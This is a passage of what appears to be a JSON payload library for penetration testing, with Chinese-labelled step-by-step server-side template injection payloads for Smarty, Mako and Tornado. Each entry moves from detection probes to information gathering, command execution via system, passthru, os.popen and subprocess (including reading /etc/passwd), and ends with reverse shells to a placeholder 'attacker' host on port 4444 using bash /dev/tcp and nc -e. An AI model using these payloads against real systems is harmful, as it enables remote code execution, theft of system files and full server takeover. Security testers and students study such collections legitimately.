        {
          "id": "3aed721c-85f8-4db2-bcac-8fd6b26ea1b6",
          "name": "Smarty模板注入",
          "entries": [
            {
              "id": "eca9e741-0960-4e71-ac06-03af38f02b55",
              "title": "payload",
              "payload": "# STEP 1 - 1. 探测SSTI\n{$smarty.version}\n{7*7}\n{$smarty.template}\n如果输出版本或49，则存在SSTI\n\n# STEP 2 - 2. 信息收集\n{$smarty.server.PHP_SELF}\n{$smarty.server.SERVER_NAME}\n{$smarty.const.PHP_VERSION}\n\n# STEP 3 - 3. 命令执行 - system\n{system(\"id\")}\n{system(\"whoami\")}\n{system(\"cat /etc/passwd\")}\n\n# STEP 4 - 4. 命令执行 - passthru\n{passthru(\"id\")}\n{passthru(\"ls -la\")}\n{passthru(\"cat /etc/passwd\")}\n\n# STEP 5 - 5. 命令执行 - exec\n{exec(\"id\",$output)}\n{foreach from\u003d$output item\u003dline}{$line}{/foreach}\n\n# STEP 6 - 6. 反弹Shell\n{system(\"bash -c \\\"bash -i \u003e\u0026 /dev/tcp/attacker/4444 0\u003e\u00261\\\"\")}\n{system(\"nc -e /bin/sh attacker 4444\")}"
            }
          ]
        },
        {
          "id": "33decc99-637c-4778-91bc-40085bfd5f81",
          "name": "Mako模板注入",
          "entries": [
            {
              "id": "af47938c-c8b0-4957-b1ce-3dc768f3d696",
              "title": "payload",
              "payload": "# STEP 1 - 1. 探测SSTI\n${7*7}\n${self}\n${self.module}\n如果输出49或模块信息，则存在SSTI\n\n# STEP 2 - 2. 信息收集\n${self.module.cache.util}\n${self.module.cache.util.os}\n${dir(self)}\n\n# STEP 3 - 3. 命令执行 - os模块\n${self.module.cache.util.os.popen(\"id\").read()}\n${self.module.cache.util.os.popen(\"whoami\").read()}\n${self.module.cache.util.os.system(\"id\")}\n\n# STEP 4 - 4. 命令执行 - subprocess\n\u003c%\nimport subprocess\n%\u003e\n${subprocess.check_output([\"id\",\"-a\"])}\n${subprocess.Popen([\"id\"],stdout\u003dsubprocess.PIPE).communicate()[0]}\n\n# STEP 5 - 5. 反弹Shell\n${self.module.cache.util.os.popen(\"bash -c \\\"bash -i \u003e\u0026 /dev/tcp/attacker/4444 0\u003e\u00261\\\"\").read()}"
            }
          ]
        },
        {
          "id": "a56d1019-6f71-467d-8ddd-ddec1cb1ef88",
          "name": "Tornado模板注入",
          "entries": [
            {
              "id": "9c13635d-cd66-467c-ae9e-32125d70ce61",
              "title": "payload",
              "payload": "# STEP 1 - 1. 探测SSTI\n{{7*7}}\n{{handler}}\n{{request}}\n如果输出49或handler对象，则存在SSTI\n\n# STEP 2 - 2. 信息收集\n{{handler.settings}}\n{{handler.application}}\n{{request.headers}}\n{{request.cookies}}\n\n# STEP 3 - 3. 命令执行 - os\n{% import os %}\n{{os.popen(\"id\").read()}}\n{{os.popen(\"whoami\").read()}}\n{{os.system(\"id\")}}\n\n# STEP 4 - 4. 命令执行 - subprocess\n{% import subprocess %}\n{{subprocess.check_output([\"id\",\"-a\"])}}\n{{subprocess.Popen([\"id\"],stdout\u003d-1).communicate()[0]}}\n\n# STEP 5 - 5. 反弹Shell\n{% import os %}\n{{os.popen(\"bash -c \\\"bash -i \u003e\u0026 /dev/tcp/attacker/4444 0\u003e\u00261\\\"\").read()}}"
